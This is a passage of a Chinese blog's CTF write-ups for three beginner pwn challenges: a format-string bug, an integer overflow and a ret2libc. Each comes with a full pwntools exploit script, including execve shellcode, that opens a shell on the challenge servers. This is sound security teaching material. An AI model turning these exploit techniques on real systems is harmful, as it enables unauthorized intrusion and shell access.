title="0x09 string"></a>0x09 string</h1><ul><li>题目宛如玩RPG游戏。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170059.png" alt></p><ul><li>先是给了你俩secret 让你去打龙, <code>secret[0]</code>就是v3的首地址,后面会用到。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170107.png" alt></p><ul><li>然后让你输入角色名字来创建角色。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170134.png" alt></p><ul><li>问你往哪走, 很明显根据逻辑需要走<code>east</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170151.png" alt></p><ul><li>让你给它个地址,然后输入你的愿望,这里有明显的格式化字符串漏洞<code>printf(&amp;format, &amp;format);</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813170202.png" alt></p><ul><li><p>最后如果<code>*a1 == a1[1]</code> 即 最开始的<code>v3[0]</code> = 85,巫师就会帮助你,你就可以自己创造一个<code>v1函数</code>来执行了,这个函数肯定要创造成能拿到shell的函数。</p></li><li><p>目标地址直接传给了v2, v2和format相连。</p></li><li><p><code>_isoc99_scanf(&quot;%s&quot;,&amp;format);</code>到<code>format</code>的偏移为8,但是目标地址是存入v2了,所以实际偏移应该为8-1=7</p></li><li><p>shellcode就是通用的shellcode了,具体看下面链接。</p></li></ul><p><a href="https://blog.csdn.net/p0x1307/article/details/46930371" target="_blank" rel="noopener">传送门</a></p><p><a href="https://www.baidu.com/link?url=DDjEkMfUGayueESdAP9QGL9vcJiTn1EEViZxS1-yW-orbaW7LnX3QkHj6dEI7vxnW1-JoB-1Dj-1uCofBHyztK&wd=&eqid=f4138c0c00148608000000025d52c1a9" target="_blank" rel="noopener">传送门</a></p><ul><li>exp如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">34306</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line"></span><br><span class="line">add = c.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">add = int(add,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'name be:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'LiuLian'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'east or up?:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'east'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'leave(0)?:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Give me an address'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(str(add))</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'you wish is:'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">85</span> + <span class="string">'%7$n'</span></span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'USE YOU SPELL\n'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x10-int-overflow"><a href="#0x10-int-overflow" class="headerlink" title="0x10 int_overflow"></a>0x10 int_overflow</h1><ul><li>考察整数溢出漏洞。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813164736.png" alt></p><ul><li>这是个模拟登陆系统。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813164751.png" alt></p><ul><li>俩<code>read函数</code>都没有溢出点,接着查看<code>check_passwd</code>函数。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813164845.png" alt></p><ul><li><p>发现了危险函数<code>strcpy</code>,<code>s(即passwd)</code>的空间明显大于<code>dest</code>的空间,可以通过这里进行溢出。</p></li><li><p>但是要进入这个<code>else</code>语句,需要 <code>v3(即passwd的长度)</code>大于3 小于等于8,但是很明显这个长度根本不够写<code>payload</code>,所以要在这里进行整形溢出。</p></li><li><p>查看汇编语言可以看到</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813165250.png" alt></p><ul><li><p><code>passwd</code>的长度是用<code>al</code>寄存器来传值的,而<code>al</code>寄存器是8位寄存器,传值的范围为<code>0~255</code>,超过这个范围就会造成溢出。</p></li><li><p>实际长度256的话,传值以后为0, 257-&gt;1, 258-&gt;2 …以此类推。</p></li><li><p>所以我们只需要让这个<code>s(即passwd)</code>的长度在260~264之间即可。</p></li><li><p>查找字符串能找到<code>cat flag</code> 来到对应位置,是一个后门函数。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190813165711.png" alt></p><ul><li><p>后门函数的地址为<code>0x0804868B</code></p></li><li><p><code>dest</code>距离<code>ebp</code>的偏移为<code>0x14</code>,覆盖<code>ebp</code>需要4个字节,所以得到payload为:</p></li><li><p><code>payload = &#39;a&#39;*0x14 + &#39;a&#39;*4 + p32(0x0804868B) + &#39;a&#39;*(260-0x14-4-4)</code></p></li><li><p>payload不唯一, 最后那个地方,260~264都可以。</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">52568</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x14</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(<span class="number">0x0804868B</span>) + <span class="string">'a'</span>*(<span class="number">260</span><span class="number">-0x14</span><span class="number">-4</span><span class="number">-4</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Please input your username:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'LiuLian'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Please input your passwd:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x11-level3"><a href="#0x11-level3" class="headerlink" title="0x11 level3"></a>0x11 level3</h1><ul><li><p>这题是<code>Jarvis OJ - [XMAN]</code>的原题,但是在攻防世界平台上面出了点bug,题目没给全(少了libc-2.19.so),而且远程怎么都跑不出来。</p></li><li><p>原题链接:</p></li></ul><p><a href="https://dn.jarvisoj.com/challengefiles/level3.rar.2047525b05c499c9dd189ba212bba1f8" target="_blank" rel="noopener">传送门</a></p><ul><li>以原题为例吧。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814173615.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814173626.png" alt></p><ul><li><p><code>read函数</code>位置存在明显的栈溢出,但是这个题和<code>level2</code>不同,<code>level2</code>程序中存在<code>system函数</code>和<code>/bin/sh</code>,只是<code>system函数</code>用来<code>echo</code>一些信息,<code>/bin/sh</code>没有被调用。</p></li><li><p>但是这道题目程序中没有<code>system函数</code>,也不存在<code>/bin/sh</code>。</p></li><li><p>由于题目给了libc文件,考虑ret2libc。</p></li><li><p>正常的溢出思路如下。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1251324-20171126214819578-1152036283.png" alt></p><ul><li><p>但是由于不知道<code>sys_addr</code>和<code>bin addr</code>的值,我们要想办法知道这俩的值。</p></li><li><p>但是我们可以利用<code>函数在内存中的地址和libc文件中的偏移的差相等</code>,通过程序中的已有函数,比如<code>read</code>和<code>write</code>来获得这个偏移差。而且给了libc文件,我们就能知道<code>system函数</code>和<code>/bin/sh</code>在libc文件中的地址,从而通过<code>sys_addr - sys_libc == write_addr - write_libc == 偏移差offset</code>,得到<code>sys_addr</code>,同理可得<code>bin addr</code>。</p></li><li><p>曾试了好久能不能直接把<code>writegot</code>的值直接<code>print</code>出来,然而并没有成功,可能因为我太菜了,也可能是因为这个办法不可行。</p></li><li><p>有一些技术性的文章,对做这个题目挺有帮助的,强烈建议看一看第一篇。</p></li></ul><p><a href="https://www.jianshu.com/p/6626a866ad66" target="_blank" rel="noopener">传送门</a></p><p><a href="https://blog.csdn.net/zhangmiaoping23/article/details/82590259" target="_blank" rel="noopener">传送门</a></p><ul><li>这道题目用到了这么一个点。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814211046.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814211117.png" alt></p><ul><li>基本思路已经很清晰了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190814211151.png" alt></p><blockquote><p>在32位程序运行中，函数参数直接压入栈中<br>调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</p></blockquote><ul><li>所以我们要想办法构成这种形式,我们的调用函数即<code>write函数</code>,后面的参数都是传给这个<code>write函数</code>的,调用完毕以后返回到我们的<code>函数的返回地址</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/1251324-20171126215553468-1721731322.png" alt></p><ul><li>从而exp如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process("./level3")</span></span><br><span class="line">io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9879</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line">writeplt = elf.plt[<span class="string">"write"</span>]<span class="comment">#plt和got都在可执行程序中</span></span><br><span class="line">writegot = elf.got[<span class="string">"write"</span>]</span><br><span class="line">func = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> writegot</span><br><span class="line"><span class="keyword">print</span> u32(writegot)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">writelibc = libc.symbols[<span class="string">"write"</span>]<span class="comment">#libc中可以找到程序中有的/没有的函数的偏移</span></span><br><span class="line">syslibc = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binlibc = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(writeplt) + p32(func) + p32(<span class="number">1</span>)+p32(writegot)+p32(<span class="number">4</span>)<span class="comment">#溢出地址+返回地址+参数</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">writeaddr = u32(io.recv(<span class="number">4</span>))<span class="comment">#由于python没有指针，不能*write_got，需要将其输出并保存</span></span><br><span class="line">sysaddr = writeaddr - writelibc + syslibc<span class="comment">#利用偏移量相等获得其真实地址</span></span><br><span class="line">binaddr = writeaddr - writelibc + binlibc</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(sysaddr) + p32(func) + p32(binaddr)</span><br><span class="line">io.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p><strong>后续补充</strong></p><p>后来在刷BUUCTF的时候写了一个能打通的EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./level3')</span></span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26690</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x08048484</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Input:\n'</span>,timeout = <span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'bbbb'</span> + p32(elf.plt[<span class="string">'write'</span>]) + p32(main) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">'write'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">write_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">'write_addr = '</span> + hex(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Input:\n'</span>,timeout = <span class="number">0.5</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'bbbb'</span> + p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="新手练习区已完结"><a href="#新手练习区已完结" class="headerlink" title="新手练习区已完结"></a>新手练习区已完结</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/94.jpg" alt></p></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------至此本文结束<i class="fa fa-tree"></i>感谢您的阅读-------------</div></div></div><div><div id="reward-container"><div>如果觉得这篇文章对您有用，请随意打赏。 (๑•⌄•๑) 您的支持将鼓励我继续创作！</div><button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">打赏</button><div id="qr" style="display:none"><div style="display:inline-block"><img src="/images/Wechat_SKM.png" alt="LiuLian 微信支付"><p>微信支付</p></div><div style="display:inline-block"><img src="/images/ZFB_SKM.png" alt="LiuLian 支付宝"><p>支付宝</p></div></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>LiuLian</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="http://liul14n.top/2019/08/08/攻防世界-Pwn/" title="攻防世界-Pwn">http://liul14n.top/2019/08/08/攻防世界-Pwn/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2019/08/04/Bugku-Pwn4/" rel="next" title="Bugku-Pwn4"><i class="fa fa-chevron-left"></i> Bugku-Pwn4</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/2019/09/23/从一道题目学习gdb脚本/" rel="prev" title="从一道题目学习gdb脚本">从一道题目学习gdb脚本 <i class="fa fa-chevron-right"></i></a></div></div></footer></div></article></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><div class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/touxiang.jpeg" alt="LiuLian"><p class="site-author-name" itemprop="name">LiuLian</p><div class="site-description motion-element" itemprop="description">Salute The Time</div></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">58</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">8</span> <span class="site-state-item-name">分类</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/LiuL14n" title="GitHub &rarr; https://github.com/LiuL14n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a> </span><span class="links-of-author-item"><a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" title="E-Mail &rarr; http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a> </span><span class="links-of-author-item"><a href="http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" title="QQ &rarr; http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a></span></div><div class="links-of-blogroll motion-element links-of-blogroll-block"><div class="links-of-blogroll-title"><i class="fa fa-fw fa-link"></i> From 大佬 import&nbsp; <i class="fa fa-fw fa-link"></i></div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><a href="https://suxinghe39.github.io/" title="SuXingHe" target="_blank">SuXingHe</a></li><li class="links-of-blogroll-item"><a href="https://hal900000.github.io" title="Hal90000" target="_blank">Hal90000</a></li><li class="links-of-blogroll-item"><a href="http://n4tsu.top/" title="Natsu" target="_blank">Natsu</a></li><li class="links-of-blogroll-item"><a href="https://dililidala.github.io" title="Ohrxw" target="_blank">Ohrxw</a></li><li class="links-of-blogroll-item"><a href="http://www.wendev.site" title="JiangWen" target="_blank">JiangWen</a></li><li class="links-of-blogroll-item"><a href="https://l0ne1y.xyz/" title="L0ne1y" target="_blank">L0ne1y</a></li></ul><div id="days"></div><script>function show_date_time(){window.setTimeout("show_date_time()",1e3),BirthDay=new Date("04/25/2019 21:13:14"),today=new Date,timeold=today.getTime()-BirthDay.getTime(),sectimeold=timeold/1e3,secondsold=Math.floor(sectimeold),msPerDay=864e5,e_daysold=timeold/msPerDay,daysold=Math.floor(e_daysold),e_hrsold=24*(e_daysold-daysold),hrsold=setzero(Math.floor(e_hrsold)),e_minsold=60*(e_hrsold-hrsold),minsold=setzero(Math.floor(60*(e_hrsold-hrsold))),seconds=setzero(Math.floor(60*(e_minsold-minsold))),document.getElementById("days").innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒"}function setzero(e){return e<10&&(e="0"+e),e}show_date_time()</script></div></div></div><div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-get-shell"><span class="nav-number">1.</span> <span class="nav-text">0x01 get_shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-CGfsb"><span class="nav-number">2.</span> <span class="nav-text">0x02 CGfsb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#补充"><span class="nav-number">2.1.</span> <span class="nav-text">补充</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-when-did-you-born"><span class="nav-number">3.</span> <span class="nav-text">0x03 when_did_you_born</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-hello-pwn"><span class="nav-number">4.</span> <span class="nav-text">0x04 hello_pwn</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-level0"><span class="nav-number">5.</span> <span class="nav-text">0x05 level0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-level2"><span class="nav-number">6.</span> <span class="nav-text">0x06 level2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07-guess-num"><span class="nav-number">7.</span> <span class="nav-text">0x07 guess_num</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路一"><span class="nav-number">7.1.</span> <span class="nav-text">思路一</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一"><span class="nav-number">7.1.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二"><span class="nav-number">7.1.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路二"><span class="nav-number">7.2.</span> <span class="nav-text">思路二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x08-cgpwn2"><span class="nav-number">8.</span> <span class="nav-text">0x08 cgpwn2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x09-string"><span class="nav-number">9.</span> <span class="nav-text">0x09 string</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x10-int-overflow"><span class="nav-number">10.</span> <span class="nav-text">0x10 int_overflow</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x11-level3"><span class="nav-number">11.</span> <span class="nav-text">0x11 level3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#新手练习区已完结"><span class="nav-number">12.</span> <span class="nav-text">新手练习区已完结</span></a></li></ol></div></div></div><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span> <span class="with-love" id="animate"><i class="fa fa-star"></i> </span><span class="author" itemprop="copyrightHolder">LiuLian</span></div><div class="powered-by"><i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv"> 本站访客数:<span id="busuanzi_value_site_pv"></span></span></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span class="busuanzi-value" id="busuanzi_value_site_uv"></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-s"></i> </span><span class="site-pv" title="总访问量"><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span></div></div></footer></div><script>"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script color="255,105,180" opacity="0.6" zindex="-1" count="77" src="/lib/canvas-nest/canvas-nest.min.js"></script><script src="/lib/jquery/index.js?v=2.1.3"></script><script src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script src="/js/utils.js?v=7.1.0"></script><script src="/js/motion.js?v=7.1.0"></script><script src="/js/affix.js?v=7.1.0"></script><script src="/js/schemes/pisces.js?v=7.1.0"></script><script src="/js/scrollspy.js?v=7.1.0"></script><script src="/js/post-details.js?v=7.1.0"></script><script src="/js/next-boot.js?v=7.1.0"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script>$(".highlight").each(function(e,t){var n=$("<div>").addClass("highlight-wrap");$(t).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(e){var t=$(this).parent().find(".code").find(".line").map(function(e,t){return $(t).text()}).toArray().join("\n"),n=document.createElement("textarea"),o=window.pageYOffset||document.documentElement.scrollTop;n.style.top=o+"px",n.style.position="absolute",n.style.opacity="0",n.readOnly=!0,n.value=t,document.body.appendChild(n),n.select(),n.setSelectionRange(0,t.length),n.readOnly=!1;document.execCommand("copy");n.blur(),$(this).blur()})).on("mouseleave",function(e){var t=$(this).find(".copy-btn");setTimeout(function(){t.text("复制")},300)}).append(t)})</script><script type="text/javascript" color="0,191,255" opacity="1" zindex="-2" count="60" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/clicklove.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{jsonPath:"/live2dw/assets/z16.model.json"},display:{position:"right",width:210,height:420},mobile:{show:!0},log:!1})</script></body></html>